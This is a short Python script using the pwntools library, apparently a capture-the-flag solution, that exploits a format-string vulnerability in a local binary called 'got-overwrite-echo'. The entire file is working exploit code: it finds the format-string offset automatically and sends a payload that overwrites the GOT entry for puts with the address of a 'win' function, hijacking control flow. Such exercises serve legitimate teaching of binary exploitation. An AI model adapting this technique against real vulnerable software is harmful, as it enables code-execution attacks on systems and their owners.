from pwn import *

context.binary = ELF("./got-overwrite-echo")

def exec_fmt(payload):
    p = process("./got-overwrite-echo")
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p = process("./got-overwrite-echo")

payload = fmtstr_payload(offset, {context.binary.got.puts: context.binary.sym.win})

p.sendafter("echo?\n", payload)

print(p.recvall().strip().decode(errors = "ignore"))
